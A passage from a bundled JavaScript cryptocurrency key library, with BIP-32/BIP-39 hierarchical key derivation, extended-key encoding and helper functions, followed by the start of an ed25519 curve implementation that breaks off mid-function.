        return await path.reduce(async (promise, pathNode) => {
          const derivedNode = await promise;
          const [pathType, pathPart] = pathNode.split(':');
          if (!hasDeriver(pathType)) {
            throw new Error(`Unknown derivation type: "${pathType}"`);
          }
          const deriver = derivers_1.derivers[pathType];
          return await deriver.deriveChildKey({
            path: pathPart,
            node: derivedNode,
            curve: curves_1.getCurveByName(curve)
          });
        }, Promise.resolve(node));
      }
      exports.deriveKeyFromPath = deriveKeyFromPath;
      function hasDeriver(pathType) {
        return pathType in derivers_1.derivers;
      }
      function validatePathSegment(path, hasKey, depth) {
        if (path.length === 0) {
          throw new Error(`Invalid HD path segment: The segment must not be empty.`);
        }
        if (path.length - 1 > constants_1.MAX_BIP_44_DEPTH) {
          throw new Error(`Invalid HD path segment: The segment cannot exceed a 0-indexed depth of 5.`);
        }
        let startsWithBip39 = false;
        path.forEach((node, index) => {
          if (index === 0) {
            startsWithBip39 = constants_1.BIP_39_PATH_REGEX.test(node);
            if (!startsWithBip39 && !constants_1.BIP_32_PATH_REGEX.test(node)) {
              throw getMalformedError();
            }
          } else if (!constants_1.BIP_32_PATH_REGEX.test(node)) {
            throw getMalformedError();
          }
        });
        if (depth === constants_1.MIN_BIP_44_DEPTH && (!startsWithBip39 || path.length !== 1)) {
          throw new Error(`Invalid HD path segment: The segment must consist of a single BIP-39 node for depths of ${constants_1.MIN_BIP_44_DEPTH}. Received: "${path}".`);
        }
        if (!hasKey && !startsWithBip39) {
          throw new Error('Invalid derivation parameters: Must specify parent key if the first node of the path segment is not a BIP-39 node.');
        }
        if (hasKey && startsWithBip39) {
          throw new Error('Invalid derivation parameters: May not specify parent key if the path segment starts with a BIP-39 node.');
        }
      }
      exports.validatePathSegment = validatePathSegment;
      function getMalformedError() {
        throw new Error('Invalid HD path segment: The path segment is malformed.');
      }
    }, {
      "./BIP44CoinTypeNode": 17,
      "./BIP44Node": 18,
      "./SLIP10Node": 19,
      "./constants": 20,
      "./curves": 23,
      "./derivers": 28
    }],
    26: [function (require, module, exports) {
      (function () {
        (function () {
          "use strict";

          Object.defineProperty(exports, "__esModule", {
            value: true
          });
          exports.privateAdd = exports.deriveChildKey = exports.publicKeyToEthAddress = exports.privateKeyToEthAddress = void 0;
          const sha3_1 = require("@noble/hashes/sha3");
          const hmac_1 = require("@noble/hashes/hmac");
          const sha512_1 = require("@noble/hashes/sha512");
          const constants_1 = require("../constants");
          const utils_1 = require("../utils");
          const curves_1 = require("../curves");
          const SLIP10Node_1 = require("../SLIP10Node");
          function privateKeyToEthAddress(key) {
            if (!Buffer.isBuffer(key) || !utils_1.isValidBufferKey(key, constants_1.BUFFER_KEY_LENGTH)) {
              throw new Error('Invalid key: The key must be a 32-byte, non-zero Buffer.');
            }
            const publicKey = curves_1.secp256k1.getPublicKey(key, false);
            return publicKeyToEthAddress(publicKey);
          }
          exports.privateKeyToEthAddress = privateKeyToEthAddress;
          function publicKeyToEthAddress(key) {
            if (!Buffer.isBuffer(key) || !utils_1.isValidBufferKey(key, curves_1.secp256k1.publicKeyLength)) {
              throw new Error('Invalid key: The key must be a 65-byte, non-zero Buffer.');
            }
            return Buffer.from(sha3_1.keccak_256(key.slice(1)).slice(-20));
          }
          exports.publicKeyToEthAddress = publicKeyToEthAddress;
          async function deriveChildKey({
            path,
            node,
            curve = curves_1.secp256k1
          }) {
            const isHardened = path.includes(`'`);
            if (!isHardened && !curve.deriveUnhardenedKeys) {
              throw new Error(`Invalid path: Cannot derive unhardened child keys with ${curve.name}.`);
            }
            if (!node) {
              throw new Error('Invalid parameters: Must specify a node to derive from.');
            }
            if (isHardened && !node.privateKey) {
              throw new Error('Invalid parameters: Cannot derive hardened child keys without a private key.');
            }
            const indexPart = path.split(`'`)[0];
            const childIndex = parseInt(indexPart, 10);
            if (!/^\d+$/u.test(indexPart) || !Number.isInteger(childIndex) || childIndex < 0 || childIndex >= constants_1.BIP_32_HARDENED_OFFSET) {
              throw new Error(`Invalid BIP-32 index: The index must be a non-negative decimal integer less than ${constants_1.BIP_32_HARDENED_OFFSET}.`);
            }
            if (node.privateKeyBuffer) {
              const secretExtension = await deriveSecretExtension({
                privateKey: node.privateKeyBuffer,
                childIndex,
                isHardened,
                curve
              });
              const {
                privateKey,
                chainCode
              } = await generateKey({
                privateKey: node.privateKeyBuffer,
                chainCode: node.chainCodeBuffer,
                secretExtension,
                curve
              });
              return SLIP10Node_1.SLIP10Node.fromExtendedKey({
                privateKey,
                chainCode,
                depth: node.depth + 1,
                parentFingerprint: node.fingerprint,
                index: childIndex + (isHardened ? constants_1.BIP_32_HARDENED_OFFSET : 0),
                curve: curve.name
              });
            }
            const publicExtension = await derivePublicExtension({
              parentPublicKey: node.compressedPublicKeyBuffer,
              childIndex,
              curve
            });
            const {
              publicKey,
              chainCode
            } = generatePublicKey({
              publicKey: node.compressedPublicKeyBuffer,
              chainCode: node.chainCodeBuffer,
              publicExtension,
              curve
            });
            return SLIP10Node_1.SLIP10Node.fromExtendedKey({
              publicKey,
              chainCode,
              depth: node.depth + 1,
              parentFingerprint: node.fingerprint,
              index: childIndex,
              curve: curve.name
            });
          }
          exports.deriveChildKey = deriveChildKey;
          async function deriveSecretExtension({
            privateKey,
            childIndex,
            isHardened,
            curve
          }) {
            if (isHardened) {
              const indexBuffer = Buffer.allocUnsafe(4);
              indexBuffer.writeUInt32BE(childIndex + constants_1.BIP_32_HARDENED_OFFSET, 0);
              const pk = privateKey;
              const zb = Buffer.alloc(1, 0);
              return Buffer.concat([zb, pk, indexBuffer]);
            }
            const indexBuffer = Buffer.allocUnsafe(4);
            indexBuffer.writeUInt32BE(childIndex, 0);
            const parentPublicKey = await curve.getPublicKey(privateKey, true);
            return Buffer.concat([parentPublicKey, indexBuffer]);
          }
          async function derivePublicExtension({
            parentPublicKey,
            childIndex
          }) {
            const indexBuffer = Buffer.alloc(4);
            indexBuffer.writeUInt32BE(childIndex, 0);
            return Buffer.concat([parentPublicKey, indexBuffer]);
          }
          function privateAdd(privateKeyBuffer, tweakBuffer, curve) {
            const privateKey = utils_1.bytesToNumber(privateKeyBuffer);
            const tweak = utils_1.bytesToNumber(tweakBuffer);
            if (tweak >= curve.curve.n) {
              throw new Error('Invalid tweak: Tweak is larger than the curve order.');
            }
            const added = curves_1.mod(privateKey + tweak, curve.curve.n);
            if (!curve.isValidPrivateKey(added)) {
              throw new Error('Invalid private key or tweak: The resulting private key is invalid.');
            }
            return utils_1.hexStringToBuffer(added.toString(16).padStart(64, '0'));
          }
          exports.privateAdd = privateAdd;
          async function generateKey({
            privateKey,
            chainCode,
            secretExtension,
            curve
          }) {
            const entropy = hmac_1.hmac(sha512_1.sha512, chainCode, secretExtension);
            const keyMaterial = Buffer.from(entropy.slice(0, 32));
            const childChainCode = Buffer.from(entropy.slice(32));
            if (curve.name === 'ed25519') {
              const publicKey = await curve.getPublicKey(keyMaterial);
              return {
                privateKey: keyMaterial,
                publicKey,
                chainCode: childChainCode
              };
            }
            const childPrivateKey = privateAdd(privateKey, keyMaterial, curve);
            const publicKey = await curve.getPublicKey(childPrivateKey);
            return {
              privateKey: childPrivateKey,
              publicKey,
              chainCode: childChainCode
            };
          }
          function generatePublicKey({
            publicKey,
            chainCode,
            publicExtension,
            curve
          }) {
            const entropy = hmac_1.hmac(sha512_1.sha512, chainCode, publicExtension);
            const keyMaterial = entropy.slice(0, 32);
            const childChainCode = entropy.slice(32);
            const childPublicKey = curve.publicAdd(publicKey, Buffer.from(keyMaterial));
            return {
              publicKey: Buffer.from(childPublicKey),
              chainCode: Buffer.from(childChainCode)
            };
          }
        }).call(this);
      }).call(this, require("buffer").Buffer);
    }, {
      "../SLIP10Node": 19,
      "../constants": 20,
      "../curves": 23,
      "../utils": 31,
      "@noble/hashes/hmac": 37,
      "@noble/hashes/sha3": 41,
      "@noble/hashes/sha512": 42,
      "buffer": 3
    }],
    27: [function (require, module, exports) {
      (function () {
        (function () {
          "use strict";

          Object.defineProperty(exports, "__esModule", {
            value: true
          });
          exports.createBip39KeyFromSeed = exports.deriveChildKey = exports.bip39MnemonicToMultipath = void 0;
          const bip39_1 = require("@scure/bip39");
          const hmac_1 = require("@noble/hashes/hmac");
          const sha512_1 = require("@noble/hashes/sha512");
          const curves_1 = require("../curves");
          const SLIP10Node_1 = require("../SLIP10Node");
          function bip39MnemonicToMultipath(mnemonic) {
            return `bip39:${mnemonic.toLowerCase().trim()}`;
          }
          exports.bip39MnemonicToMultipath = bip39MnemonicToMultipath;
          async function deriveChildKey({
            path,
            curve
          }) {
            return createBip39KeyFromSeed(Buffer.from(bip39_1.mnemonicToSeedSync(path)), curve);
          }
          exports.deriveChildKey = deriveChildKey;
          async function createBip39KeyFromSeed(seed, curve = curves_1.secp256k1) {
            const key = Buffer.from(hmac_1.hmac(sha512_1.sha512, curve.secret, seed));
            const privateKey = key.slice(0, 32);
            const chainCode = key.slice(32);
            return SLIP10Node_1.SLIP10Node.fromExtendedKey({
              privateKey,
              chainCode,
              depth: 0,
              parentFingerprint: 0,
              index: 0,
              curve: curve.name
            });
          }
          exports.createBip39KeyFromSeed = createBip39KeyFromSeed;
        }).call(this);
      }).call(this, require("buffer").Buffer);
    }, {
      "../SLIP10Node": 19,
      "../curves": 23,
      "@noble/hashes/hmac": 37,
      "@noble/hashes/sha512": 42,
      "@scure/bip39": 46,
      "buffer": 3
    }],
    28: [function (require, module, exports) {
      "use strict";

      var __createBinding = this && this.__createBinding || (Object.create ? function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        Object.defineProperty(o, k2, {
          enumerable: true,
          get: function () {
            return m[k];
          }
        });
      } : function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        o[k2] = m[k];
      });
      var __setModuleDefault = this && this.__setModuleDefault || (Object.create ? function (o, v) {
        Object.defineProperty(o, "default", {
          enumerable: true,
          value: v
        });
      } : function (o, v) {
        o["default"] = v;
      });
      var __importStar = this && this.__importStar || function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
        __setModuleDefault(result, mod);
        return result;
      };
      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.derivers = void 0;
      const bip32 = __importStar(require("./bip32"));
      const bip39 = __importStar(require("./bip39"));
      exports.derivers = {
        bip32,
        bip39
      };
    }, {
      "./bip32": 26,
      "./bip39": 27
    }],
    29: [function (require, module, exports) {
      (function () {
        (function () {
          "use strict";

          Object.defineProperty(exports, "__esModule", {
            value: true
          });
          exports.encodeExtendedKey = exports.decodeExtendedKey = exports.PRIVATE_KEY_VERSION = exports.PUBLIC_KEY_VERSION = void 0;
          const utils_1 = require("./utils");
          const BIP44Node_1 = require("./BIP44Node");
          const secp256k1_1 = require("./curves/secp256k1");
          exports.PUBLIC_KEY_VERSION = 0x0488b21e;
          exports.PRIVATE_KEY_VERSION = 0x0488ade4;
          const decodeExtendedKey = extendedKey => {
            const buffer = utils_1.decodeBase58check(extendedKey);
            if (buffer.length !== 78) {
              throw new Error(`Invalid extended key: Expected a length of 78, got ${buffer.length}.`);
            }
            const version = buffer.readUInt32BE(0);
            const depth = buffer.readUInt8(4);
            BIP44Node_1.validateBIP44Depth(depth);
            const parentFingerprint = buffer.readUInt32BE(5);
            const index = buffer.readUInt32BE(9);
            const chainCode = buffer.slice(13, 45);
            if (!utils_1.isValidBufferKey(chainCode, 32)) {
              throw new Error(`Invalid extended key: Chain code must be a 32-byte non-zero Buffer.`);
            }
            const key = buffer.slice(45, 78);
            if (!utils_1.isValidBufferKey(key, 33)) {
              throw new Error(`Invalid extended key: Key must be a 33-byte non-zero Buffer.`);
            }
            if (version === exports.PUBLIC_KEY_VERSION) {
              if (key.readUInt8(0) !== 0x02 && key.readUInt8(0) !== 0x03) {
                throw new Error(`Invalid extended key: Public key must start with 0x02 or 0x03.`);
              }
              return {
                version,
                depth,
                parentFingerprint,
                index,
                chainCode,
                publicKey: secp256k1_1.decompressPublicKey(key)
              };
            }
            if (version === exports.PRIVATE_KEY_VERSION) {
              if (key.readUInt8(0) !== 0x00) {
                throw new Error(`Invalid extended key: Private key must start with 0x00.`);
              }
              return {
                version,
                depth,
                parentFingerprint,
                index,
                chainCode,
                privateKey: key.slice(1)
              };
            }
            throw new Error(`Invalid extended key: Expected a public (xpub) or private key (xprv) version.`);
          };
          exports.decodeExtendedKey = decodeExtendedKey;
          const encodeExtendedKey = extendedKey => {
            const {
              version,
              depth,
              parentFingerprint,
              index,
              chainCode
            } = extendedKey;
            const buffer = Buffer.alloc(78);
            buffer.writeUInt32BE(version, 0);
            buffer.writeUInt8(depth, 4);
            buffer.writeUInt32BE(parentFingerprint, 5);
            buffer.writeUInt32BE(index, 9);
            chainCode.copy(buffer, 13);
            if (extendedKey.version === exports.PUBLIC_KEY_VERSION) {
              const {
                publicKey
              } = extendedKey;
              const compressedPublicKey = secp256k1_1.compressPublicKey(publicKey);
              compressedPublicKey.copy(buffer, 45);
            }
            if (extendedKey.version === exports.PRIVATE_KEY_VERSION) {
              const {
                privateKey
              } = extendedKey;
              privateKey.copy(buffer, 46);
            }
            return utils_1.encodeBase58check(buffer);
          };
          exports.encodeExtendedKey = encodeExtendedKey;
        }).call(this);
      }).call(this, require("buffer").Buffer);
    }, {
      "./BIP44Node": 18,
      "./curves/secp256k1": 24,
      "./utils": 31,
      "buffer": 3
    }],
    30: [function (require, module, exports) {
      (function () {
        (function () {
          "use strict";

          Object.defineProperty(exports, "__esModule", {
            value: true
          });
          exports.PackageBuffer = exports.BIP44PurposeNodeToken = exports.MAX_BIP_44_DEPTH = exports.MIN_BIP_44_DEPTH = exports.getBIP44AddressKeyDeriver = exports.deriveBIP44AddressKey = exports.BIP_44_COIN_TYPE_DEPTH = exports.BIP44CoinTypeNode = exports.ed25519 = exports.secp256k1 = exports.SLIP10Node = exports.BIP44Node = void 0;
          var BIP44Node_1 = require("./BIP44Node");
          Object.defineProperty(exports, "BIP44Node", {
            enumerable: true,
            get: function () {
              return BIP44Node_1.BIP44Node;
            }
          });
          var SLIP10Node_1 = require("./SLIP10Node");
          Object.defineProperty(exports, "SLIP10Node", {
            enumerable: true,
            get: function () {
              return SLIP10Node_1.SLIP10Node;
            }
          });
          var curves_1 = require("./curves");
          Object.defineProperty(exports, "secp256k1", {
            enumerable: true,
            get: function () {
              return curves_1.secp256k1;
            }
          });
          Object.defineProperty(exports, "ed25519", {
            enumerable: true,
            get: function () {
              return curves_1.ed25519;
            }
          });
          var BIP44CoinTypeNode_1 = require("./BIP44CoinTypeNode");
          Object.defineProperty(exports, "BIP44CoinTypeNode", {
            enumerable: true,
            get: function () {
              return BIP44CoinTypeNode_1.BIP44CoinTypeNode;
            }
          });
          Object.defineProperty(exports, "BIP_44_COIN_TYPE_DEPTH", {
            enumerable: true,
            get: function () {
              return BIP44CoinTypeNode_1.BIP_44_COIN_TYPE_DEPTH;
            }
          });
          Object.defineProperty(exports, "deriveBIP44AddressKey", {
            enumerable: true,
            get: function () {
              return BIP44CoinTypeNode_1.deriveBIP44AddressKey;
            }
          });
          Object.defineProperty(exports, "getBIP44AddressKeyDeriver", {
            enumerable: true,
            get: function () {
              return BIP44CoinTypeNode_1.getBIP44AddressKeyDeriver;
            }
          });
          var constants_1 = require("./constants");
          Object.defineProperty(exports, "MIN_BIP_44_DEPTH", {
            enumerable: true,
            get: function () {
              return constants_1.MIN_BIP_44_DEPTH;
            }
          });
          Object.defineProperty(exports, "MAX_BIP_44_DEPTH", {
            enumerable: true,
            get: function () {
              return constants_1.MAX_BIP_44_DEPTH;
            }
          });
          Object.defineProperty(exports, "BIP44PurposeNodeToken", {
            enumerable: true,
            get: function () {
              return constants_1.BIP44PurposeNodeToken;
            }
          });
          exports.PackageBuffer = Buffer;
        }).call(this);
      }).call(this, require("buffer").Buffer);
    }, {
      "./BIP44CoinTypeNode": 17,
      "./BIP44Node": 18,
      "./SLIP10Node": 19,
      "./constants": 20,
      "./curves": 23,
      "buffer": 3
    }],
    31: [function (require, module, exports) {
      (function () {
        (function () {
          "use strict";

          Object.defineProperty(exports, "__esModule", {
            value: true
          });
          exports.getFingerprint = exports.encodeBase58check = exports.decodeBase58check = exports.getBuffer = exports.bytesToNumber = exports.isValidInteger = exports.isValidBufferKey = exports.nullableHexStringToBuffer = exports.hexStringToBuffer = exports.isValidHexString = exports.stripHexPrefix = exports.isHardened = exports.isValidBIP32Index = exports.validateBIP32Index = exports.getBIP32NodeToken = exports.getUnhardenedBIP32NodeToken = exports.getHardenedBIP32NodeToken = exports.getBIP44CoinTypeToAddressPathTuple = exports.getBIP44ChangePathString = exports.getBIP44CoinTypePathString = void 0;
          const utils_1 = require("@noble/hashes/utils");
          const base_1 = require("@scure/base");
          const sha256_1 = require("@noble/hashes/sha256");
          const ripemd160_1 = require("@noble/hashes/ripemd160");
          const constants_1 = require("./constants");
          function getBIP44CoinTypePathString(coin_type) {
            return `m / ${constants_1.BIP44PurposeNodeToken} / ${getUnhardenedBIP32NodeToken(coin_type)}'`;
          }
          exports.getBIP44CoinTypePathString = getBIP44CoinTypePathString;
          function getBIP44ChangePathString(coinTypePath, indices) {
            return `${coinTypePath} / ${getHardenedBIP32NodeToken(indices.account || 0)} / ${getBIP32NodeToken(indices.change || 0)}`;
          }
          exports.getBIP44ChangePathString = getBIP44ChangePathString;
          function getBIP44CoinTypeToAddressPathTuple({
            account = 0,
            change = 0,
            address_index
          }) {
            return [getHardenedBIP32NodeToken(account), getBIP32NodeToken(change), getBIP32NodeToken(address_index)];
          }
          exports.getBIP44CoinTypeToAddressPathTuple = getBIP44CoinTypeToAddressPathTuple;
          function getHardenedBIP32NodeToken(index) {
            validateBIP32Index(index);
            return `${getUnhardenedBIP32NodeToken(index)}'`;
          }
          exports.getHardenedBIP32NodeToken = getHardenedBIP32NodeToken;
          function getUnhardenedBIP32NodeToken(index) {
            validateBIP32Index(index);
            return `bip32:${index}`;
          }
          exports.getUnhardenedBIP32NodeToken = getUnhardenedBIP32NodeToken;
          function getBIP32NodeToken(index) {
            if (typeof index === 'number') {
              return getUnhardenedBIP32NodeToken(index);
            }
            if (!index || !Number.isInteger(index.index) || typeof index.hardened !== 'boolean') {
              throw new Error('Invalid BIP-32 index: Must be an object containing the index and whether it is hardened.');
            }
            if (index.hardened) {
              return getHardenedBIP32NodeToken(index.index);
            }
            return getUnhardenedBIP32NodeToken(index.index);
          }
          exports.getBIP32NodeToken = getBIP32NodeToken;
          function validateBIP32Index(addressIndex) {
            if (!isValidBIP32Index(addressIndex)) {
              throw new Error(`Invalid BIP-32 index: Must be a non-negative integer.`);
            }
          }
          exports.validateBIP32Index = validateBIP32Index;
          function isValidBIP32Index(index) {
            return isValidInteger(index);
          }
          exports.isValidBIP32Index = isValidBIP32Index;
          function isHardened(bip32Token) {
            return bip32Token.endsWith(`'`);
          }
          exports.isHardened = isHardened;
          function stripHexPrefix(hexString) {
            return hexString.replace(/^0x/iu, '');
          }
          exports.stripHexPrefix = stripHexPrefix;
          function isValidHexString(hexString) {
            return /^(?:0x)?[a-f0-9]+$/iu.test(hexString);
          }
          exports.isValidHexString = isValidHexString;
          function hexStringToBuffer(hexString) {
            if (Buffer.isBuffer(hexString)) {
              return hexString;
            }
            if (typeof hexString !== 'string' || !isValidHexString(hexString)) {
              throw new Error(`Invalid hex string: "${hexString}".`);
            }
            return Buffer.from(stripHexPrefix(hexString), 'hex');
          }
          exports.hexStringToBuffer = hexStringToBuffer;
          function nullableHexStringToBuffer(hexString) {
            if (hexString) {
              return hexStringToBuffer(hexString);
            }
            return undefined;
          }
          exports.nullableHexStringToBuffer = nullableHexStringToBuffer;
          function isValidBufferKey(buffer, expectedLength) {
            if (buffer.length !== expectedLength) {
              return false;
            }
            for (const byte of buffer) {
              if (byte !== 0) {
                return true;
              }
            }
            return false;
          }
          exports.isValidBufferKey = isValidBufferKey;
          function isValidInteger(value) {
            return typeof value === 'number' && Number.isInteger(value) && value >= 0;
          }
          exports.isValidInteger = isValidInteger;
          function bytesToNumber(bytes) {
            return BigInt(`0x${utils_1.bytesToHex(bytes)}`);
          }
          exports.bytesToNumber = bytesToNumber;
          function getBuffer(value, length) {
            if (value instanceof Buffer) {
              validateBuffer(value, length);
              return value;
            }
            if (typeof value === 'string') {
              if (!isValidHexString(value)) {
                throw new Error(`Invalid value: Must be a valid hex string of length: ${length * 2}.`);
              }
              const buffer = hexStringToBuffer(value);
              validateBuffer(buffer, length);
              return buffer;
            }
            throw new Error(`Invalid value: Expected a Buffer or hexadecimal string.`);
          }
          exports.getBuffer = getBuffer;
          function validateBuffer(buffer, length) {
            if (!isValidBufferKey(buffer, length)) {
              throw new Error(`Invalid value: Must be a non-zero ${length}-byte buffer.`);
            }
          }
          const decodeBase58check = value => {
            const base58Check = base_1.base58check(sha256_1.sha256);
            try {
              return Buffer.from(base58Check.decode(value));
            } catch (_a) {
              throw new Error(`Invalid value: Value is not base58-encoded, or the checksum is invalid.`);
            }
          };
          exports.decodeBase58check = decodeBase58check;
          const encodeBase58check = value => {
            const base58Check = base_1.base58check(sha256_1.sha256);
            return base58Check.encode(value);
          };
          exports.encodeBase58check = encodeBase58check;
          const getFingerprint = publicKey => {
            if (!isValidBufferKey(publicKey, 33)) {
              throw new Error(`Invalid public key: The key must be a 33-byte, non-zero Buffer.`);
            }
            return Buffer.from(ripemd160_1.ripemd160(publicKey)).readUInt32BE(0);
          };
          exports.getFingerprint = getFingerprint;
        }).call(this);
      }).call(this, require("buffer").Buffer);
    }, {
      "./constants": 20,
      "@noble/hashes/ripemd160": 39,
      "@noble/hashes/sha256": 40,
      "@noble/hashes/utils": 43,
      "@scure/base": 45,
      "buffer": 3
    }],
    32: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.utils = exports.curve25519 = exports.getSharedSecret = exports.sync = exports.verify = exports.sign = exports.getPublicKey = exports.Signature = exports.Point = exports.RistrettoPoint = exports.ExtendedPoint = exports.CURVE = void 0;
      const nodeCrypto = require("crypto");
      const _0n = BigInt(0);
      const _1n = BigInt(1);
      const _2n = BigInt(2);
      const CU_O = BigInt('7237005577332262213973186563042994240857116359379907606001950938285454250989');
      const CURVE = Object.freeze({
        a: BigInt(-1),
        d: BigInt('37095705934669439343138083508754565189542113879843219016388785533085940283555'),
        P: BigInt('57896044618658097711785492504343953926634992332820282019728792003956564819949'),
        l: CU_O,
        n: CU_O,
        h: BigInt(8),
        Gx: BigInt('15112221349535400772501151409588531511454012693041857206046113283949847762202'),
        Gy: BigInt('46316835694926478169428394003475163141307993866256225615783033603165251855960')
      });
      exports.CURVE = CURVE;
      const POW_2_256 = BigInt('0x10000000000000000000000000000000000000000000000000000000000000000');
      const SQRT_M1 = BigInt('19681161376707505956807079304988542015446066515923890162744021073123829784752');
      const SQRT_D = BigInt('6853475219497561581579357271197624642482790079785650197046958215289687604742');
      const SQRT_AD_MINUS_ONE = BigInt('25063068953384623474111414158702152701244531502492656460079210482610430750235');
      const INVSQRT_A_MINUS_D = BigInt('54469307008909316920995813868745141605393597292927456921205312896311721017578');
      const ONE_MINUS_D_SQ = BigInt('1159843021668779879193775521855586647937357759715417654439879720876111806838');
      const D_MINUS_ONE_SQ = BigInt('40440834346308536858101042469323190826248399146238708352240133220865137265952');
      class ExtendedPoint {
        constructor(x, y, z, t) {
          this.x = x;
          this.y = y;
          this.z = z;
          this.t = t;
        }
        static fromAffine(p) {
          if (!(p instanceof Point)) {
            throw new TypeError('ExtendedPoint#fromAffine: expected Point');
          }
          if (p.equals(Point.ZERO)) return ExtendedPoint.ZERO;
          return new ExtendedPoint(p.x, p.y, _1n, mod(p.x * p.y));
        }
        static toAffineBatch(points) {
          const toInv = invertBatch(points.map(p => p.z));
          return points.map((p, i) => p.toAffine(toInv[i]));
        }
        static normalizeZ(points) {
          return this.toAffineBatch(points).map(this.fromAffine);
        }
        equals(other) {
          assertExtPoint(other);
          const {
            x: X1,
            y: Y1,
            z: Z1
          } = this;
          const {
            x: X2,
            y: Y2,
            z: Z2
          } = other;
          const X1Z2 = mod(X1 * Z2);
          const X2Z1 = mod(X2 * Z1);
          const Y1Z2 = mod(Y1 * Z2);
          const Y2Z1 = mod(Y2 * Z1);
          return X1Z2 === X2Z1 && Y1Z2 === Y2Z1;
        }
        negate() {
          return new ExtendedPoint(mod(-this.x), this.y, this.z, mod(-this.t));
        }
        double() {
          const {
            x: X1,
            y: Y1,
            z: Z1
          } = this;
          const {
            a
          } = CURVE;
          const A = mod(X1 * X1);
          const B = mod(Y1 * Y1);
          const C = mod(_2n * mod(Z1 * Z1));
          const D = mod(a * A);
          const x1y1 = X1 + Y1;
          const E = mod(mod(x1y1 * x1y1) - A - B);
          const G = D + B;
          const F = G - C;
          const H = D - B;
          const X3 = mod(E * F);
          const Y3 = mod(G * H);
          const T3 = mod(E * H);
          const Z3 = mod(F * G);
          return new ExtendedPoint(X3, Y3, Z3, T3);
        }
        add(other) {
          assertExtPoint(other);
          const {
            x: X1,
            y: Y1,
            z: Z1,
            t: T1
          } = this;
          const {
            x: X2,
            y: Y2,
            z: Z2,
            t: T2
          } = other;
          const A = mod((Y1 - X1) * (Y2 + X2));
          const B = mod((Y1 + X1) * (Y2 - X2));
          const F = mod(B - A);
          if (F === _0n) return this.double();
          const C = mod(Z1 * _2n * T2);
          const D = mod(T1 * _2n * Z2);
          const E = D + C;
          const G = B + A;
          const H = D - C;
          const X3 = mod(E * F);
          const Y3 = mod(G * H);
          const T3 = mod(E * H);
          const Z3 = mod(F * G);
          return new ExtendedPoint(X3, Y3, Z3, T3);
        }
        subtract(other) {
          return this.add(other.negate());
        }
        precomputeWindow(W) {
          const windows = 1 + 256 / W;
          const points = [];
          let p = this;
          let base = p;
          for (let window = 0; window < windows; window++) {
            base = p;
            points.push(base);
            for (let i = 1; i < 2 ** (W - 1); i++) {
              base = base.add(p);
              points.push(base);
            }
            p = base.double();
          }
          return points;
        }
        wNAF(n, affinePoint) {
          if (!affinePoint && this.equals(ExtendedPoint.BASE)) affinePoint = Point.BASE;
          const W = affinePoint && affinePoint._WINDOW_SIZE || 1;
          if (256 % W) {
            throw new Error('Point#wNAF: Invalid precomputation window, must be power of 2');
          }
          let precomputes = affinePoint && pointPrecomputes.get(affinePoint);
          if (!precomputes) {
            precomputes = this.precomputeWindow(W);
            if (affinePoint && W !== 1) {
              precomputes = ExtendedPoint.normalizeZ(precomputes);
              pointPrecomputes.set(affinePoint, precomputes);
            }
          }
          let p = ExtendedPoint.ZERO;
          let f = ExtendedPoint.ZERO;
          const windows = 1 + 256 / W;
          const windowSize = 2 ** (W - 1);
          const mask = BigInt(2 ** W - 1);
          const maxNumber = 2 ** W;
          const shiftBy = BigInt(W);
          for (let window = 0; window < windows; window++) {
            const offset = window * windowSize;
            let wbits = Number(n & mask);
            n >>= shiftBy;
            if (wbits > windowSize) {
              wbits -= maxNumber;
              n += _1n;
            }
            if (wbits === 0) {
              let pr = precomputes[offset];
              if (window % 2) pr = pr.negate();
              f = f.add(pr);
            } else {
              let cached = precomputes[offset + Math.abs(wbits) - 1];
              if (wbits < 0) cached = cached.negate();
              p = p.add(cached);
            }
          }
          return ExtendedPoint.normalizeZ([p, f])[0];
        }
        multiply(scalar, affinePoint) {
          return this.wNAF(normalizeScalar(scalar, CURVE.l), affinePoint);
        }
        multiplyUnsafe(scalar) {
          let n = normalizeScalar(scalar, CURVE.l, false);
          const G = ExtendedPoint.BASE;
          const P0 = ExtendedPoint.ZERO;
          if (n === _0n) return P0;
          if (this.equals(P0) || n === _1n) return this;
          if (this.equals(G)) return this.wNAF(n);
          let p = P0;
          let d = this;
          while (n > _0n) {
            if (n & _1n) p = p.add(d);
            d = d.double();
            n >>= _1n;
          }
          return p;
        }
        isSmallOrder() {
          return this.multiplyUnsafe(CURVE.h).equals(ExtendedPoint.ZERO);
        }
        isTorsionFree() {
          return this.multiplyUnsafe(CURVE.l).equals(ExtendedPoint.ZERO);
        }
        toAffine(invZ = invert(this.z)) {
          const {
            x,
            y,
            z
          } = this;
          const ax = mod(x * invZ);
          const ay = mod(y * invZ);
          const zz = mod(z * invZ);
          if (zz !== _1n) throw new Error('invZ was invalid');
          return new Point(ax, ay);
        }
        fromRistrettoBytes() {
          legacyRist();
        }
        toRistrettoBytes() {
          legacyRist();
        }
        fromRistrettoHash() {
          legacyRist();
        }
      }
      exports.ExtendedPoint = ExtendedPoint;
      ExtendedPoint.BASE = new ExtendedPoint(CURVE.Gx, CURVE.Gy, _1n, mod(CURVE.Gx * CURVE.Gy));
      ExtendedPoint.ZERO = new ExtendedPoint(_0n, _1n, _1n, _0n);
      function assertExtPoint(other) {
        if (!(other instanceof ExtendedPoint)) throw new TypeError('ExtendedPoint expected');
      }
      function assertRstPoint(other) {
        if (!(other instanceof RistrettoPoint)) throw new TypeError('RistrettoPoint expected');
      }
      function legacyRist() {
        throw new Error('Legacy method: switch to RistrettoPoint');
      }
      class RistrettoPoint {
        constructor(ep) {
          this.ep = ep;
        }
        static calcElligatorRistrettoMap(r0) {
          const {
            d
          } = CURVE;
          const r = mod(SQRT_M1 * r0 * r0);
          const Ns = mod((r + _1n) * ONE_MINUS_D_SQ);
          let c = BigInt(-1);
          const D = mod((c - d * r) * mod(r + d));
          let {
            isValid: Ns_D_is_sq,
            value: s
          } = uvRatio(Ns, D);
          let s_ = mod(s * r0);
          if (!edIsNegative(s_)) s_ = mod(-s_);
          if (!Ns_D_is_sq) s = s_;
          if (!Ns_D_is_sq) c = r;
          const Nt = mod(c * (r - _1n) * D_MINUS_ONE_SQ - D);
          const s2 = s * s;
          const W0 = mod((s + s) * D);
